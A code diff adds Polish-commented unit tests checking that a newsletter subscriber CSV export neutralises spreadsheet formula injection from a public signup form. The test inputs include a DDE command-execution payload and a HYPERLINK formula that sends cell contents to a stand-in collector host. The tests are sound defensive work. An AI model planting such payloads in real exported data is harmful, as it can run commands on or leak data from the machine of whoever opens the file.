@@ -190,6 +190,63 @@ describe("csvCell - cytowanie RFC 4180", () => {
     expect(csvCell(null)).toBe("");
     expect(csvCell(undefined)).toBe("");
   });
+
+  it("wiodący znak formuły dostaje apostrof, liczba NIE", () => {
+    // Re-eksport `csvCell` z `subscriberTable` musi nieść tę samą regułę
+    // BEZPIECZEŃSTWA, co wspólny moduł - inaczej panel po cichu omija
+    // neutralizację, bo woła własną kopię cytowania.
+    expect(csvCell("=1+1")).toBe("'=1+1");
+    expect(csvCell("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
+    expect(csvCell("-12.5")).toBe("-12.5");
+    expect(csvCell(-12.5)).toBe("-12.5");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// WSTRZYKNIĘCIE FORMUŁY DROGĄ PUBLICZNEGO FORMULARZA
+// ---------------------------------------------------------------------------
+// Ten eksport jest końcem łańcucha, który zaczyna się POZA systemem: pole nazwy
+// w formularzu zapisu do newslettera jest publiczne, więc treść komórki pisze
+// osoba postronna. Napastnik nie potrzebuje żadnego dostępu do panelu -
+// wystarczy, że operator wyeksportuje listę i otworzy plik lokalnie w arkuszu.
+describe("subscribersToCsv - ładunek wpisany w publiczny formularz", () => {
+  it("nazwa zaczynająca się od `=` NIE jest formułą po otwarciu eksportu", () => {
+    const csv = subscribersToCsv([row({ display_name: "=cmd|'/c calc'!A0" })]);
+    const cells = (csv.split("\n")[1] ?? "").split(",");
+
+    expect(cells[1]).toBe("'=cmd|'/c calc'!A0");
+    expect(cells[1]?.startsWith("=")).toBe(false);
+  });
+
+  it("ładunek z przecinkiem jest i zneutralizowany, i zacytowany", () => {
+    const csv = subscribersToCsv([
+      row({ display_name: '=HYPERLINK("https://zbieram.example/?d="&A1,"Zwrot")' }),
+    ]);
+    const line = csv.split("\n")[1] ?? "";
+
+    // Apostrof stoi WEWNĄTRZ cudzysłowów. Odwrotna kolejność dałaby pole
+    // niecytowane zaczynające się od apostrofu i cudzysłów w środku, czyli
+    // neutralizacja zepsułaby układ kolumn, którego cytowanie ma pilnować.
+    expect(line).toContain(`,"'=HYPERLINK(`);
+    expect(line).not.toContain(`,'"=HYPERLINK(`);
+    // Ładunek zostaje w pliku - operator ma prawo zobaczyć, co ktoś wpisał.
+    expect(line).toContain("HYPERLINK");
+  });
+
+  it("ŹRÓDŁO zapisu przechodzi tę samą neutralizację co nazwa", () => {
+    // Źródło bywa przepisywane z parametru adresu URL formularza, więc jest
+    // dokładnie tak samo obce jak nazwa.
+    const csv = subscribersToCsv([row({ source: "@SUM(A1:A9)" })]);
+
+    expect(csv.split("\n")[1]).toContain("'@SUM(A1:A9)");
+  });
+
+  it("data zapisu zostaje datą - reguła patrzy tylko na pierwszy znak", () => {
+    const csv = subscribersToCsv([row()]);
+
+    expect(csv.split("\n")[1]).toContain("2026-08-01T10:00:00.000Z");
+    expect(csv).not.toContain("'2026");
+  });
 });
 
 describe("subscribersToCsv", () => {
